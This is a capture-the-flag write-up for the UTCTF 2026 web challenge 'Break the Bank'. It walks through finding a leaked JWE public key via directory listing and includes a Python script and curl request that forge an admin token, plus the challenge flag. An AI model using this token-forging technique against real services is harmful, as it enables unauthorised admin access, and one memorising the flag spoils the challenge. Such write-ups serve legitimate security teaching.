---
title: "UTCTF: Writeup for Web/Break the Bank"
date: 2026-03-15
description: "JWE Misconfiguration: Breaking Authentication Through Public Key Leakage"
tags:
  - CTF
  - Web Security
  - JWE
category: Writeups
author: 0xuserm9
draft: false
---

## Challenge Overview

- **CTF**: UTCTF 2026
- **Challenge**: Break the Bank
- **Category**: Web Exploitation
- **Points**: 278
- **Flag**: `utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}`
- **Description**: "Let's just say that this bank isn't exactly following the latest trends in web design (or web security, for that matter). Just take a look at that website!"
- **Author**: Emmett (@emdawg25)

## TL;DR

The application leaked its JWE public key via a directory listing, allowing attackers to forge admin tokens by encrypting `{"sub":"admin"}` with the exposed key. The server mistakenly treated successful decryption as proof of authenticity.

## Step 1: Mapping the Application

Navigating to the target revealed a retro banking interface with minimal functionality:
- Static homepage with branding
- Login page at `/login.html`

## Step 2: Finding Test Credentials

Scrolling through the HTML source, I found a link buried in the footer:

```html
<a href="/resources/FNSB_InternetBanking_Guide.pdf">   Access our Internet Banking guide here. </a>
```

Extracting text from this PDF revealed:
> **Demo Access**: Username: `testuser` Password: `testpass123`

These credentials proved crucial for understanding the authentication flow.

## Step 3: Authentication Analysis

Logging in as `testuser` revealed:

**Request:**
```http
POST /login HTTP/1.1
Content-Type: application/json

{"username":"testuser","password":"testpass123"}
```

**Response:**
```http
HTTP/1.1 200 OK
Set-Cookie: fnsb_token=eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.U5JzT4X... [truncated]

{"token":"eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.U5JzT4X...","redirect":"/profile"}
```

The token format immediately suggested JWE (JSON Web Encryption) - a 5-part structure separated by dots:
`BASE64URL(protected_header).BASE64URL(encrypted_key).BASE64URL(iv).BASE64URL(ciphertext).BASE64URL(tag)`

**Token Analysis:**
```json
{
  "cty": "JWT",
  "enc": "A256GCM",
  "alg": "RSA-OAEP-256"
}
```

This is not a standard JWT (which is usually signed). It’s a JWE (JSON Web Encryption) token. JWE is used to encrypt the payload, not to sign it.

- **alg**: `RSA-OAEP-256` – the key encryption algorithm. The server encrypts a random Content Encryption Key (CEK) with its RSA public key.
- **enc**: `A256GCM` – the content encryption algorithm. The payload is encrypted with AES-256-GCM using the CEK.

The crucial point: RSA-OAEP is an asymmetric encryption scheme. Anyone possessing the public key can encrypt data that only the holder of the private key can decrypt.

## Testing the Admin Area

With the session cookie, I tried accessing `/admin`:

The response was:
```json
{"error":"Forbidden: admin subject required"}
```

This error tells us two things:
1. The server uses the `sub` (subject) claim from the token to authorize access.
2. If we can forge a token with `"sub":"admin"`, we can bypass the restriction.

## Directory Listing Exposure

While enumerating directories, I discovered that `/resources/` had directory listing enabled:

**Index of /resources/**
- `FNSB_InternetBanking_Guide.pdf` (2026-03-14 14:23, 2.4M)
- `key.pem` (2026-03-14 14:23, 1.7K)
- `memo.txt` (2026-03-14 14:23, 0.1K)

## The Fatal Leak: key.pem

Downloading and examining `/resources/key.pem` revealed:

```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
OQIDAQAB
-----END PUBLIC KEY-----
```

## Crafting the Forged JWE Token

Python script to encrypt a malicious payload using the server's own public key:

```python
from joserfc import jwe
from joserfc.jwk import RSAKey
from joserfc.jwe import JWERegistry
import json

# Load the exposed public key
# In the CTF, you'd save it as key.pem locally
# with open("key.pem", "rb") as f:
#     key = RSAKey.import_key(f.read())

registry = JWERegistry(algorithms=["RSA-OAEP-256", "A256GCM"])

# Match the exact header structure of real tokens
protected = {"cty": "JWT", "alg": "RSA-OAEP-256", "enc": "A256GCM"}

# Forge an admin payload
payload = {"sub": "admin"}
plaintext = json.dumps(payload, separators=(',', ':')).encode()

# token = jwe.encrypt_compact(protected, plaintext, key, registry=registry)
# print(token)
```

## Use the Forged Token

```bash
curl -s -H "Cookie: fnsb_token=$TOKEN" http://challenge.utctf.live:5926/admin
```

The response contains the admin console and the flag:

```html
<!DOCTYPE html>
<html>
<head><title>FNSB SysAdmin Console</title></head>
<body>
    <h1>Welcome, Administrator</h1>
    <div class="flag">utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}</div>
    ...
</body>
</html>
```

Happy Hacking 🏴‍☠️
